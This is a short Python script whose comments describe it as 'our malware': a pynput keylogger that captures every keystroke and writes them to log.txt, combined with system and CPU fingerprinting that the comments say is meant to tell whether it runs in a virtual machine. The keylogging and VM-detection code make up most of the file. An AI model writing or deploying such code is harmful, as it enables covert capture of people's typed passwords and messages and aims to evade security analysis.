import pynput #Allows us to control and monitor input devices Keyboard and mouse only.
import psutil #Allows us to retrieve information on system specs, 
import platform #Allows us to get more information about the system architecture
from datetime import datetime  #Allows us to use dates/time for our malware
import datetime #Allows us to use time/dates from the machine.
from pynput.keyboard import Key, Listener

count=0  
keys=[]  

#This monitors save everything that has been typed on any platform 
def onpress(key):
    global keys,count
    # print("{0} pressed".format(key))
   # print(key)
    keys.append(key)
    count +=1

    if(count>=5):
        count=0
        writetofile(keys)
        keys=[]
        fileopen=1

#This allows you to save what has been typed and save it so it doesnt get lost
def onrelease(key):
    if(key== Key.esc):
        return (False)
#This creates a new log.txt and enters everything that has been saved into a log.txt
def writetofile(keys):

    with open("log.txt","w" ) as f:
        for i in keys:
            k=str(i).replace("'","")
            if(k.find("space")>0):
                f.write(' ')
            elif(k.find("Key")== -1):
                f.write(k)
# Prints out Our system specs 
def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor
print("="*40, "System Information", "="*40)
uname = platform.uname()
print(f"System: {uname.system}")
print(f"Node Name: {uname.node}")
print(f"Release: {uname.release}")
print(f"Version: {uname.version}")
print(f"Machine: {uname.machine}")
print(f"Processor: {uname.processor}")

#This section code  lets us get the current date and time of the machine. Which will be handy as we will be able to figure out if its a virtual machine.

import datetime

x = datetime.datetime.now()

print(x.strftime("%c"))

#This section code is very important as this will allow us more information about the Virtual machine, so we can know if it is a virtual machine or not


# let's print CPU information
print("="*40, "CPU Info", "="*40)
# number of cores
print("Physical cores:", psutil.cpu_count(logical=False))
print("Total cores:", psutil.cpu_count(logical=True))
# CPU frequencies
cpufreq = psutil.cpu_freq()
print(f"Max Frequency: {cpufreq.max:.2f}Mhz")
print(f"Min Frequency: {cpufreq.min:.2f}Mhz")
print(f"Current Frequency: {cpufreq.current:.2f}Mhz")
# CPU usage
print("CPU Usage Per Core:")
for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
    print(f"Core {i}: {percentage}%")
print(f"Total CPU Usage: {psutil.cpu_percent()}%")				
				
				

with Listener(on_press=onpress, on_release= onrelease) as listener:
    listener.join()

	
	
	
	
